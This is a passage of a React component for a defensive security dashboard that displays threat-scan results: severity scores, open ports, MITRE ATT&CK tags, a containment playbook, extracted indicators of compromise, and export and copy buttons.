                className="w-full p-4 bg-transparent font-mono text-xs text-amber-200/90 placeholder-slate-600 focus:outline-none resize-y selection:bg-amber-500/30 selection:text-white"
              />
            </div>

            {/* ERROR DISPLAY */}
            {rawAnalysisError && (
              <div className="p-3.5 rounded-xl bg-red-950/40 border border-red-500/40 text-red-300 text-xs flex items-center gap-2">
                <AlertTriangle className="w-4 h-4 shrink-0 text-red-400" />
                <span>{rawAnalysisError}</span>
              </div>
            )}

            {/* ACTION BUTTON */}
            <div className="flex flex-col sm:flex-row items-center justify-between gap-4 pt-2">
              <div className="text-xs text-slate-400 flex items-center gap-2">
                <Sparkles className="w-4 h-4 text-amber-400" />
                <span>Model: Pre-Trained 3-Hidden-Layer MLP Neural Network (128→64→32 ReLU)</span>
              </div>

              <button
                type="button"
                onClick={handleAnalyzeRaw}
                disabled={isAnalyzingRaw || !rawTelemetryText.trim()}
                className={`w-full sm:w-auto px-8 py-3.5 rounded-xl font-heading text-xs font-black uppercase tracking-wider flex items-center justify-center gap-2 transition-all shadow-xl ${
                  isAnalyzingRaw || !rawTelemetryText.trim()
                    ? 'bg-slate-800 text-slate-500 cursor-not-allowed border border-white/5'
                    : 'bg-gradient-to-r from-amber-500 via-red-600 to-amber-600 hover:from-amber-400 hover:to-red-500 text-white shadow-[0_0_25px_rgba(245,158,11,0.4)] border border-amber-400/30 active:scale-95'
                }`}
              >
                {isAnalyzingRaw ? (
                  <>
                    <RefreshCw className="w-4 h-4 animate-spin text-white" />
                    EXTRACTING & EVALUATING WITH MLP NEURAL NET...
                  </>
                ) : (
                  <>
                    <Zap className="w-4 h-4 text-white" />
                    ⚡ ANALYZE THREATS (AI + BIG DATA MLP)
                  </>
                )}
              </button>
            </div>
          </div>

          {/* TELEMETRY RESULTS SCORECARD */}
          {rawAnalysisResult && (() => {
            const critCount = rawAnalysisResult.alerts.filter(a => a.severity === 'CRITICAL' || a.severity === 'HIGH').length;
            const medCount = rawAnalysisResult.alerts.filter(a => a.severity === 'MEDIUM' || a.severity === 'LOW').length;
            const portsCount = rawAnalysisResult.summary.open_ports_identified.length;

            const displayedAlerts = rawAnalysisResult.alerts.filter(a => {
              if (rawTableSearch.trim()) {
                const q = rawTableSearch.toLowerCase().trim();
                const match =
                  (a.source_ip || '').toLowerCase().includes(q) ||
                  (a.destination_ip || '').toLowerCase().includes(q) ||
                  (a.attack_type || '').toLowerCase().includes(q) ||
                  (a.protocol || '').toLowerCase().includes(q) ||
                  (a.service || '').toLowerCase().includes(q) ||
                  (a.threat_title || '').toLowerCase().includes(q) ||
                  (a.mitre_technique || '').toLowerCase().includes(q) ||
                  String(a.source_port || '').includes(q) ||
                  String(a.destination_port || '').includes(q);
                if (!match) return false;
              }
              if (rawTableFilter === 'threats') return a.severity === 'CRITICAL' || a.severity === 'HIGH';
              if (rawTableFilter === 'critical') return a.severity === 'CRITICAL';
              return true;
            });

            return (
              <div className="space-y-6 animate-fadeIn">

                {/* 1. REPORT EXPORT TOOLBAR */}
                <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 p-4 rounded-2xl bg-gradient-to-r from-slate-900 via-slate-950 to-slate-900 border border-amber-500/30 shadow-xl">
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="text-xs font-bold text-white uppercase tracking-wider font-mono">
                        Assessment Scan ID: <strong className="text-amber-400">{rawAnalysisResult.scan_id}</strong>
                      </span>
                      <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30">
                        ANALYSIS READY
                      </span>
                    </div>
                    <div className="text-[11px] text-slate-400 mt-1 font-mono">
                      Format: <strong className="text-cyan-300 uppercase">{rawAnalysisResult.summary.input_type_detected}</strong> • Parsed: <strong className="text-white">{rawAnalysisResult.summary.total_events_parsed}</strong> events • Threats: <strong className="text-red-400">{rawAnalysisResult.summary.threats_detected}</strong> • Open Ports: <strong className="text-amber-300">{portsCount}</strong>
                    </div>
                  </div>

                  {/* Export & Download Buttons */}
                  <div className="flex flex-wrap items-center gap-2">
                    {/* PDF */}
                    <button
                      type="button"
                      onClick={handleExportPdf}
                      className="px-3.5 py-1.5 rounded-xl text-xs font-bold bg-gradient-to-r from-red-700/40 to-rose-600/30 text-red-300 hover:text-white border border-red-500/50 hover:border-red-400 transition-all flex items-center gap-1.5 shadow-[0_0_15px_rgba(239,68,68,0.25)]"
                      title="Downloads styled HTML report — open in browser then Ctrl+P → Save as PDF"
                    >
                      <FileText className="w-3.5 h-3.5" /> PDF
                    </button>
                    {/* DOC */}
                    <button
                      type="button"
                      onClick={handleExportDoc}
                      className="px-3.5 py-1.5 rounded-xl text-xs font-bold bg-gradient-to-r from-blue-700/40 to-indigo-600/30 text-blue-300 hover:text-white border border-blue-500/50 hover:border-blue-400 transition-all flex items-center gap-1.5 shadow-[0_0_15px_rgba(59,130,246,0.25)]"
                      title="Download as Microsoft Word (.doc) document"
                    >
                      <FileCode className="w-3.5 h-3.5" /> DOC
                    </button>
                    {/* TXT */}
                    <button
                      type="button"
                      onClick={() => serverDownloadReport('txt')}
                      className="px-3 py-1.5 rounded-xl text-xs font-bold bg-slate-900 hover:bg-slate-800 text-amber-300 border border-amber-500/40 hover:border-amber-400 transition-all flex items-center gap-1.5 shadow-md"
                    >
                      <FileText className="w-3.5 h-3.5 text-amber-400" /> TXT
                    </button>
                    <button
                      type="button"
                      onClick={handleExportRawCsv}
                      className="px-3 py-1.5 rounded-xl text-xs font-bold bg-slate-900 hover:bg-slate-800 text-cyan-300 border border-cyan-500/40 hover:border-cyan-400 transition-all flex items-center gap-1.5 shadow-md"
                    >
                      <Download className="w-3.5 h-3.5" /> CSV
                    </button>
                    <button
                      type="button"
                      onClick={handleExportRawJson}
                      className="px-3 py-1.5 rounded-xl text-xs font-bold bg-slate-900 hover:bg-slate-800 text-purple-300 border border-purple-500/40 hover:border-purple-400 transition-all flex items-center gap-1.5 shadow-md"
                    >
                      <FileCode className="w-3.5 h-3.5" /> JSON
                    </button>
                  </div>
                </div>

                {/* 2. TOP METRIC SCORECARDS */}
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
                  {/* Severity & Max Risk */}
                  <div className="bg-slate-900/90 border border-slate-800 p-5 rounded-2xl shadow-xl flex flex-col justify-between">
                    <div className="flex items-center justify-between text-xs text-slate-400 font-bold uppercase tracking-wider">
                      <span>Overall Severity</span>
                      <Flame className={`w-4 h-4 ${
                        rawAnalysisResult.summary.overall_severity === 'CRITICAL' ? 'text-red-400 animate-pulse' :
                        rawAnalysisResult.summary.overall_severity === 'HIGH' ? 'text-orange-400' : 'text-yellow-400'
                      }`} />
                    </div>
                    <div className="my-3 flex items-baseline gap-3">
                      <span className={`text-2xl font-black px-3 py-1 rounded-xl uppercase tracking-wider ${
                        rawAnalysisResult.summary.overall_severity === 'CRITICAL' ? 'bg-red-500/20 text-red-400 border border-red-500/40' :
                        rawAnalysisResult.summary.overall_severity === 'HIGH' ? 'bg-orange-500/20 text-orange-400 border border-orange-500/40' :
                        'bg-yellow-500/20 text-yellow-400 border border-yellow-500/40'
                      }`}>
                        {rawAnalysisResult.summary.overall_severity}
                      </span>
                      <span className="text-xl font-black text-white font-mono">
                        {rawAnalysisResult.summary.max_risk_score.toFixed(1)} / 100
                      </span>
                    </div>
                    <div className="w-full bg-slate-950 rounded-full h-2 overflow-hidden border border-slate-800">
                      <div
                        className={`h-full rounded-full transition-all duration-700 ${
                          rawAnalysisResult.summary.max_risk_score >= 85 ? 'bg-gradient-to-r from-orange-500 to-red-500' :
                          rawAnalysisResult.summary.max_risk_score >= 65 ? 'bg-gradient-to-r from-yellow-500 to-orange-500' :
                          'bg-gradient-to-r from-emerald-500 to-yellow-500'
                        }`}
                        style={{ width: `${Math.min(rawAnalysisResult.summary.max_risk_score, 100)}%` }}
                      />
                    </div>
                  </div>

                  {/* Primary Threat Profile */}
                  <div className="bg-slate-900/90 border border-slate-800 p-5 rounded-2xl shadow-xl flex flex-col justify-between">
                    <div className="flex items-center justify-between text-xs text-slate-400 font-bold uppercase tracking-wider">
                      <span>Primary Threat Profile</span>
                      <Shield className="w-4 h-4 text-indigo-400" />
                    </div>
                    <div className="my-2">
                      <div className="text-base font-black text-white line-clamp-2">
                        {rawAnalysisResult.summary.primary_threat}
                      </div>
                      <div className="text-[11px] text-indigo-400 mt-1 flex items-center gap-1 font-mono">
                        <Cpu className="w-3 h-3" />
                        {rawAnalysisResult.summary.model_used.split(' ')[0]} {rawAnalysisResult.summary.model_used.split(' ')[1]}
                      </div>
                    </div>
                    <div className="text-xs text-slate-400 font-mono">
                      Parsed: <strong className="text-white">{rawAnalysisResult.summary.total_events_parsed}</strong> events • Threats: <strong className="text-red-400">{rawAnalysisResult.summary.threats_detected}</strong>
                    </div>
                  </div>

                  {/* Open Ports & Services */}
                  <div className="bg-slate-900/90 border border-slate-800 p-5 rounded-2xl shadow-xl flex flex-col justify-between">
                    <div className="flex items-center justify-between text-xs text-slate-400 font-bold uppercase tracking-wider">
                      <span>Open Ports & Services</span>
                      <Server className="w-4 h-4 text-cyan-400" />
                    </div>
                    <div className="my-2">
                      {rawAnalysisResult.summary.open_ports_identified.length > 0 ? (
                        <div className="flex flex-wrap gap-1.5 max-h-16 overflow-y-auto">
                          {rawAnalysisResult.summary.open_ports_identified.map(port => (
                            <span
                              key={port}
                              className={`px-2 py-0.5 rounded text-[11px] font-mono font-bold ${
                                port === 445 || port === 3389 || port === 139 || port === 21
                                  ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                                  : 'bg-cyan-500/15 text-cyan-300 border border-cyan-500/30'
                              }`}
                            >
                              Port {port}
                            </span>
                          ))}
                        </div>
                      ) : (
                        <div className="text-xs text-slate-400">None explicitly parsed</div>
                      )}
                    </div>
                    <div className="text-[11px] text-slate-400 truncate font-mono">
                      Target: <span className="text-cyan-300 font-bold">{rawAnalysisResult.summary.target_hosts.join(', ') || 'Auto'}</span>
                    </div>
                  </div>

                  {/* MITRE ATT&CK Mapping */}
                  <div className="bg-slate-900/90 border border-slate-800 p-5 rounded-2xl shadow-xl flex flex-col justify-between">
                    <div className="flex items-center justify-between text-xs text-slate-400 font-bold uppercase tracking-wider">
                      <span>MITRE ATT&CK Techniques</span>
                      <Layers className="w-4 h-4 text-purple-400" />
                    </div>
                    <div className="my-2 flex flex-wrap gap-1.5 max-h-16 overflow-y-auto">
                      {rawAnalysisResult.summary.mitre_techniques.map(tech => (
                        <span key={tech} className="px-2 py-0.5 rounded bg-purple-500/20 text-purple-300 border border-purple-500/40 text-[11px] font-mono font-bold">
                          {tech}
                        </span>
                      ))}
                    </div>
                    <div className="text-[11px] text-slate-400">
                      Input: <strong className="text-amber-400 font-mono">{rawAnalysisResult.summary.input_type_detected}</strong>
                    </div>
                  </div>
                </div>

                {/* 3. AUTONOMOUS AI CONTAINMENT PLAYBOOK */}
                <div className="bg-gradient-to-r from-slate-900 via-slate-950 to-indigo-950/40 border border-indigo-500/40 rounded-2xl p-6 shadow-2xl space-y-4">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="p-2.5 bg-indigo-500/20 border border-indigo-500/40 rounded-xl text-indigo-400">
                        <Shield className="w-5 h-5" />
                      </div>
                      <div>
                        <h3 className="text-sm font-black text-white uppercase tracking-wider flex items-center gap-2">
                          Autonomous AI Containment Playbook
                          <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-indigo-500/20 text-indigo-300 border border-indigo-500/30">
                            SOAR READY
                          </span>
                        </h3>
                        <p className="text-xs text-slate-400">
                          {rawAnalysisResult.ai_playbook.executive_summary}
                        </p>
                      </div>
                    </div>
                  </div>

                  {/* Immediate Containment Command */}
                  <div className="bg-slate-950 border border-slate-800 rounded-xl p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3 font-mono">
                    <div className="space-y-1">
                      <div className="text-[10px] font-bold uppercase tracking-wider text-slate-400">
                        Immediate Perimeter Firewall Drop Rule:
                      </div>
                      <code className="text-xs text-emerald-400 break-all">
                        {rawAnalysisResult.ai_playbook.immediate_containment}
                      </code>
                    </div>

                    <button
                      type="button"
                      onClick={() => handleCopyCommand(rawAnalysisResult.ai_playbook.immediate_containment, 'soar_cmd')}
                      className="shrink-0 px-4 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-white text-xs font-bold transition-all flex items-center gap-2 border border-white/10"
                    >
                      {copiedCommand === 'soar_cmd' ? (
                        <>
                          <Check className="w-3.5 h-3.5 text-emerald-400" />
                          <span className="text-emerald-400">COPIED!</span>
                        </>
                      ) : (
                        <>
                          <Copy className="w-3.5 h-3.5 text-cyan-400" />
                          <span>COPY RULE</span>
                        </>
                      )}
                    </button>
                  </div>

                  {/* SOC Tactical Investigation Checklist */}
                  <div className="pt-2">
                    <div className="text-xs font-bold text-slate-300 uppercase tracking-wider mb-2 flex items-center gap-2">
                      <CheckCircle className="w-4 h-4 text-cyan-400" />
                      SOC Tactical Investigation Checklist:
                    </div>
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-2">
                      {rawAnalysisResult.ai_playbook.soc_investigation_steps.map((step, idx) => (
                        <div key={idx} className="p-2.5 rounded-xl bg-slate-950/60 border border-slate-800/80 text-xs text-slate-300 flex items-start gap-2">
                          <span className="w-4 h-4 rounded-full bg-indigo-500/20 text-indigo-400 font-bold text-[10px] flex items-center justify-center shrink-0 mt-0.5">
                            {idx + 1}
                          </span>
                          <span>{step}</span>
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                {/* 4. EXTRACTED IOCs & THREAT ARTIFACT MATRIX (LINKS, MAILS, URLs, IPs, HASHES, CVEs) */}
                <div className="bg-slate-900/90 border border-amber-500/30 rounded-2xl shadow-2xl p-6 space-y-5">
                  <div className="flex flex-col md:flex-row md:items-center justify-between gap-4 border-b border-slate-800 pb-4">
                    <div className="flex items-center gap-3">
                      <div className="p-2.5 bg-amber-500/20 border border-amber-500/40 rounded-xl text-amber-400">
                        <Bug className="w-5 h-5" />
                      </div>
                      <div>
                        <h3 className="text-sm font-black text-white uppercase tracking-wider flex items-center gap-2">
                          Extracted Indicators of Compromise (IOCs) & Threat Artifacts
                          <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-amber-500/20 text-amber-300 border border-amber-500/30">
                            {
                              ((rawAnalysisResult.iocs?.suspicious_ips?.length || 0) +
                              (rawAnalysisResult.iocs?.urls_and_links?.length || 0) +
                              (rawAnalysisResult.iocs?.emails?.length || 0) +
                              (rawAnalysisResult.iocs?.file_hashes?.length || 0) +
                              (rawAnalysisResult.iocs?.suspicious_files?.length || 0) +
                              (rawAnalysisResult.iocs?.cves?.length || 0))
                            } ARTIFACTS
                          </span>
                        </h3>
                        <p className="text-xs text-slate-400">
                          Automated entity extraction parsing suspicious adversary IPs, target hosts, malicious links, phishing emails, file hashes, and exploit CVEs
                        </p>
                      </div>
                    </div>

                    <div className="flex flex-wrap items-center gap-2">
                      <button
                        type="button"
                        onClick={handleCopyAllIocs}
                        className="px-3 py-1.5 rounded-xl bg-amber-500/15 hover:bg-amber-500/25 text-amber-300 border border-amber-500/30 text-xs font-bold transition-all flex items-center gap-1.5 shadow-sm"
                      >
                        {copiedCommand === 'all_iocs' ? (
                          <>
                            <Check className="w-3.5 h-3.5 text-emerald-400" />
                            <span className="text-emerald-400">ALL IOCs COPIED!</span>
                          </>
                        ) : (
                          <>
                            <Copy className="w-3.5 h-3.5 text-amber-400" />
                            <span>Copy All IOCs</span>
                          </>
                        )}
                      </button>

                      <button
                        type="button"
                        onClick={handleExportIocsJson}
                        className="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-xs font-semibold transition-all flex items-center gap-1.5"
                      >
                        <Download className="w-3.5 h-3.5 text-cyan-400" />
                        <span>Export IOCs (JSON)</span>
                      </button>

                      <button
                        type="button"
                        onClick={handleExportIocsTxt}
                        className="px-3 py-1.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700 text-xs font-semibold transition-all flex items-center gap-1.5"
                      >
                        <FileText className="w-3.5 h-3.5 text-emerald-400" />
                        <span>Export IOCs (TXT)</span>
                      </button>
                    </div>
                  </div>

                  {/* IOC Category Cards Grid */}
                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4">
                    {/* 1. SUSPICIOUS ADVERSARY IPs */}
                    <div className="bg-slate-950/70 border border-red-500/30 rounded-xl p-4 space-y-2.5 flex flex-col justify-between">
                      <div>
                        <div className="flex items-center justify-between border-b border-red-500/20 pb-2 mb-2">
                          <span className="text-xs font-bold uppercase tracking-wider text-red-400 flex items-center gap-1.5">
                            <ShieldAlert className="w-4 h-4 text-red-400" />
                            Suspicious IPs
                          </span>
                          <span className="text-[10px] font-black px-1.5 py-0.5 rounded bg-red-500/20 text-red-300 font-mono">
                            {rawAnalysisResult.iocs?.suspicious_ips?.length || 0}
                          </span>
                        </div>
                        <div className="max-h-40 overflow-y-auto space-y-1.5 pr-1 text-xs">
                          {rawAnalysisResult.iocs?.suspicious_ips && rawAnalysisResult.iocs.suspicious_ips.length > 0 ? (
                            rawAnalysisResult.iocs.suspicious_ips.map((ip, idx) => (
                              <div key={idx} className="flex items-center justify-between p-1.5 rounded bg-red-950/30 border border-red-500/20 text-red-200 font-mono text-[11px] group">
                                <span className="truncate">{ip}</span>
                                <button
                                  type="button"
                                  onClick={() => handleCopyIoc(ip, `ip_${idx}`)}
                                  className="text-slate-400 hover:text-white p-1 transition-colors"
                                  title="Copy IP"
                                >
                                  {copiedCommand === `ip_${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                                </button>
                              </div>
                            ))
                          ) : (
                            <div className="text-[11px] text-slate-500 italic py-2 text-center">No external scanner IPs detected</div>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* 2. TARGET INFRASTRUCTURE IPs */}
                    <div className="bg-slate-950/70 border border-cyan-500/30 rounded-xl p-4 space-y-2.5 flex flex-col justify-between">
                      <div>
                        <div className="flex items-center justify-between border-b border-cyan-500/20 pb-2 mb-2">
                          <span className="text-xs font-bold uppercase tracking-wider text-cyan-400 flex items-center gap-1.5">
                            <Server className="w-4 h-4 text-cyan-400" />
                            Target Asset IPs
                          </span>
                          <span className="text-[10px] font-black px-1.5 py-0.5 rounded bg-cyan-500/20 text-cyan-300 font-mono">
                            {rawAnalysisResult.iocs?.target_ips?.length || 0}
                          </span>
                        </div>
                        <div className="max-h-40 overflow-y-auto space-y-1.5 pr-1 text-xs">
                          {rawAnalysisResult.iocs?.target_ips && rawAnalysisResult.iocs.target_ips.length > 0 ? (
                            rawAnalysisResult.iocs.target_ips.map((ip, idx) => (
                              <div key={idx} className="flex items-center justify-between p-1.5 rounded bg-cyan-950/30 border border-cyan-500/20 text-cyan-200 font-mono text-[11px] group">
                                <span className="truncate">{ip}</span>
                                <button
                                  type="button"
                                  onClick={() => handleCopyIoc(ip, `tip_${idx}`)}
                                  className="text-slate-400 hover:text-white p-1 transition-colors"
                                  title="Copy Target IP"
                                >
                                  {copiedCommand === `tip_${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                                </button>
                              </div>
                            ))
                          ) : (
                            <div className="text-[11px] text-slate-500 italic py-2 text-center">None explicitly designated</div>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* 3. MALICIOUS URLs & LINKS */}
                    <div className="bg-slate-950/70 border border-orange-500/30 rounded-xl p-4 space-y-2.5 flex flex-col justify-between">
                      <div>
                        <div className="flex items-center justify-between border-b border-orange-500/20 pb-2 mb-2">
                          <span className="text-xs font-bold uppercase tracking-wider text-orange-400 flex items-center gap-1.5">
                            <Link className="w-4 h-4 text-orange-400" />
                            Links & URLs / URIs
                          </span>
                          <span className="text-[10px] font-black px-1.5 py-0.5 rounded bg-orange-500/20 text-orange-300 font-mono">
                            {rawAnalysisResult.iocs?.urls_and_links?.length || 0}
                          </span>
                        </div>
                        <div className="max-h-40 overflow-y-auto space-y-1.5 pr-1 text-xs">
                          {rawAnalysisResult.iocs?.urls_and_links && rawAnalysisResult.iocs.urls_and_links.length > 0 ? (
                            rawAnalysisResult.iocs.urls_and_links.map((u, idx) => (
                              <div key={idx} className="flex items-start justify-between p-1.5 rounded bg-orange-950/30 border border-orange-500/20 text-orange-200 font-mono text-[11px] gap-2 group">
                                <span className="break-all">{u}</span>
                                <button
                                  type="button"
                                  onClick={() => handleCopyIoc(u, `url_${idx}`)}
                                  className="text-slate-400 hover:text-white p-1 shrink-0 transition-colors"
                                  title="Copy URL"
                                >
                                  {copiedCommand === `url_${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                                </button>
                              </div>
                            ))
                          ) : (
                            <div className="text-[11px] text-slate-500 italic py-2 text-center">No URLs or URI paths discovered</div>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* 4. EMAILS & SPOOFED IDENTITIES */}
                    <div className="bg-slate-950/70 border border-purple-500/30 rounded-xl p-4 space-y-2.5 flex flex-col justify-between">
                      <div>
                        <div className="flex items-center justify-between border-b border-purple-500/20 pb-2 mb-2">
                          <span className="text-xs font-bold uppercase tracking-wider text-purple-400 flex items-center gap-1.5">
                            <Mail className="w-4 h-4 text-purple-400" />
                            Extracted Emails
                          </span>
                          <span className="text-[10px] font-black px-1.5 py-0.5 rounded bg-purple-500/20 text-purple-300 font-mono">
                            {rawAnalysisResult.iocs?.emails?.length || 0}
                          </span>
                        </div>
                        <div className="max-h-40 overflow-y-auto space-y-1.5 pr-1 text-xs">
                          {rawAnalysisResult.iocs?.emails && rawAnalysisResult.iocs.emails.length > 0 ? (
                            rawAnalysisResult.iocs.emails.map((em, idx) => (
                              <div key={idx} className="flex items-center justify-between p-1.5 rounded bg-purple-950/30 border border-purple-500/20 text-purple-200 font-mono text-[11px] group">
                                <span className="truncate">{em}</span>
                                <button
                                  type="button"
                                  onClick={() => handleCopyIoc(em, `em_${idx}`)}
                                  className="text-slate-400 hover:text-white p-1 transition-colors"
                                  title="Copy Email"
                                >
                                  {copiedCommand === `em_${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                                </button>
                              </div>
                            ))
                          ) : (
                            <div className="text-[11px] text-slate-500 italic py-2 text-center">No email addresses detected</div>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* 5. DOMAINS & HOSTNAMES */}
                    <div className="bg-slate-950/70 border border-blue-500/30 rounded-xl p-4 space-y-2.5 flex flex-col justify-between">
                      <div>
                        <div className="flex items-center justify-between border-b border-blue-500/20 pb-2 mb-2">
                          <span className="text-xs font-bold uppercase tracking-wider text-blue-400 flex items-center gap-1.5">
                            <Globe className="w-4 h-4 text-blue-400" />
                            Domains & Hosts
                          </span>
                          <span className="text-[10px] font-black px-1.5 py-0.5 rounded bg-blue-500/20 text-blue-300 font-mono">
                            {rawAnalysisResult.iocs?.domains?.length || 0}
                          </span>
                        </div>
                        <div className="max-h-40 overflow-y-auto space-y-1.5 pr-1 text-xs">
                          {rawAnalysisResult.iocs?.domains && rawAnalysisResult.iocs.domains.length > 0 ? (
                            rawAnalysisResult.iocs.domains.map((dom, idx) => (
                              <div key={idx} className="flex items-center justify-between p-1.5 rounded bg-blue-950/30 border border-blue-500/20 text-blue-200 font-mono text-[11px] group">
                                <span className="truncate">{dom}</span>
                                <button
                                  type="button"
                                  onClick={() => handleCopyIoc(dom, `dom_${idx}`)}
                                  className="text-slate-400 hover:text-white p-1 transition-colors"
                                  title="Copy Domain"
                                >
                                  {copiedCommand === `dom_${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                                </button>
                              </div>
                            ))
                          ) : (
                            <div className="text-[11px] text-slate-500 italic py-2 text-center">No external domains identified</div>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* 6. CRYPTOGRAPHIC FILE HASHES */}
                    <div className="bg-slate-950/70 border border-emerald-500/30 rounded-xl p-4 space-y-2.5 flex flex-col justify-between">
                      <div>
                        <div className="flex items-center justify-between border-b border-emerald-500/20 pb-2 mb-2">
                          <span className="text-xs font-bold uppercase tracking-wider text-emerald-400 flex items-center gap-1.5">
                            <Hash className="w-4 h-4 text-emerald-400" />
                            File Hashes (SHA256/MD5)
                          </span>
                          <span className="text-[10px] font-black px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 font-mono">
                            {rawAnalysisResult.iocs?.file_hashes?.length || 0}
                          </span>
                        </div>
                        <div className="max-h-40 overflow-y-auto space-y-1.5 pr-1 text-xs">
                          {rawAnalysisResult.iocs?.file_hashes && rawAnalysisResult.iocs.file_hashes.length > 0 ? (
                            rawAnalysisResult.iocs.file_hashes.map((hash, idx) => (
                              <div key={idx} className="flex items-center justify-between p-1.5 rounded bg-emerald-950/30 border border-emerald-500/20 text-emerald-200 font-mono text-[10px] group">
                                <span className="truncate max-w-[170px]" title={hash}>{hash}</span>
                                <button
                                  type="button"
                                  onClick={() => handleCopyIoc(hash, `hash_${idx}`)}
                                  className="text-slate-400 hover:text-white p-1 transition-colors"
                                  title="Copy Hash"
                                >
                                  {copiedCommand === `hash_${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                                </button>
                              </div>
                            ))
                          ) : (
                            <div className="text-[11px] text-slate-500 italic py-2 text-center">No hashes present in payload</div>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* 7. WEAPONIZED FILES & BINARIES */}
                    <div className="bg-slate-950/70 border border-pink-500/30 rounded-xl p-4 space-y-2.5 flex flex-col justify-between">
                      <div>
                        <div className="flex items-center justify-between border-b border-pink-500/20 pb-2 mb-2">
                          <span className="text-xs font-bold uppercase tracking-wider text-pink-400 flex items-center gap-1.5">
                            <FileWarning className="w-4 h-4 text-pink-400" />
                            Suspicious Files
                          </span>
                          <span className="text-[10px] font-black px-1.5 py-0.5 rounded bg-pink-500/20 text-pink-300 font-mono">
                            {rawAnalysisResult.iocs?.suspicious_files?.length || 0}
                          </span>
                        </div>
                        <div className="max-h-40 overflow-y-auto space-y-1.5 pr-1 text-xs">
                          {rawAnalysisResult.iocs?.suspicious_files && rawAnalysisResult.iocs.suspicious_files.length > 0 ? (
                            rawAnalysisResult.iocs.suspicious_files.map((file, idx) => (
                              <div key={idx} className="flex items-center justify-between p-1.5 rounded bg-pink-950/30 border border-pink-500/20 text-pink-200 font-mono text-[11px] group">
                                <span className="truncate">{file}</span>
                                <button
                                  type="button"
                                  onClick={() => handleCopyIoc(file, `f_${idx}`)}
                                  className="text-slate-400 hover:text-white p-1 transition-colors"
                                  title="Copy Filename"
                                >
                                  {copiedCommand === `f_${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                                </button>
                              </div>
                            ))
                          ) : (
                            <div className="text-[11px] text-slate-500 italic py-2 text-center">No suspicious files detected</div>
                          )}
                        </div>
                      </div>
                    </div>

                    {/* 8. CVEs & VULNERABILITIES */}
                    <div className="bg-slate-950/70 border border-indigo-500/30 rounded-xl p-4 space-y-2.5 flex flex-col justify-between">
                      <div>
                        <div className="flex items-center justify-between border-b border-indigo-500/20 pb-2 mb-2">
                          <span className="text-xs font-bold uppercase tracking-wider text-indigo-400 flex items-center gap-1.5">
                            <Shield className="w-4 h-4 text-indigo-400" />
                            CVEs & Exploits
                          </span>
                          <span className="text-[10px] font-black px-1.5 py-0.5 rounded bg-indigo-500/20 text-indigo-300 font-mono">
                            {rawAnalysisResult.iocs?.cves?.length || 0}
                          </span>
                        </div>
                        <div className="max-h-40 overflow-y-auto space-y-1.5 pr-1 text-xs">
                          {rawAnalysisResult.iocs?.cves && rawAnalysisResult.iocs.cves.length > 0 ? (
                            rawAnalysisResult.iocs.cves.map((cve, idx) => (
                              <div key={idx} className="flex items-center justify-between p-1.5 rounded bg-indigo-950/30 border border-indigo-500/20 text-indigo-200 font-mono text-[11px] group">
                                <span className="truncate font-bold">{cve}</span>
                                <button
                                  type="button"
                                  onClick={() => handleCopyIoc(cve, `cve_${idx}`)}
                                  className="text-slate-400 hover:text-white p-1 transition-colors"
                                  title="Copy CVE"
                                >
                                  {copiedCommand === `cve_${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                                </button>
                              </div>
                            ))
                          ) : (
                            <div className="text-[11px] text-slate-500 italic py-2 text-center">No explicit CVE tags matched</div>
                          )}
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* 5. COMPLETE TRAFFIC DISSECTION & INDICATOR AUDIT TABLE ("SHOW ALL TRAFFIC & ALL THINGS") */}
                <div className="bg-slate-900/90 border border-slate-800 rounded-2xl shadow-xl overflow-hidden space-y-0">
                  <div className="p-5 border-b border-slate-800 flex flex-col md:flex-row md:items-center justify-between gap-4">
                    <div className="flex items-center gap-3">
                      <div className="p-2.5 bg-cyan-500/15 border border-cyan-500/30 rounded-xl text-cyan-400">
                        <Network className="w-5 h-5" />
                      </div>
                      <div>
                        <h3 className="text-sm font-black text-white uppercase tracking-wider flex items-center gap-2">
                          Complete Traffic Dissection & Threat Events ({displayedAlerts.length} / {rawAnalysisResult.alerts.length})
                          <span className="text-[10px] font-bold px-2 py-0.5 rounded-full bg-cyan-500/15 text-cyan-300 border border-cyan-500/30">
                            ALL FLOWS
                          </span>
                        </h3>
                        <p className="text-xs text-slate-400">
                          Complete telemetry breakdown across all captured frames, connection flows, open ports, and anomalous activity
                        </p>
                      </div>
                    </div>

                    {/* Filter Pills & Search */}
                    <div className="flex flex-wrap items-center gap-2">
                      <div className="relative">
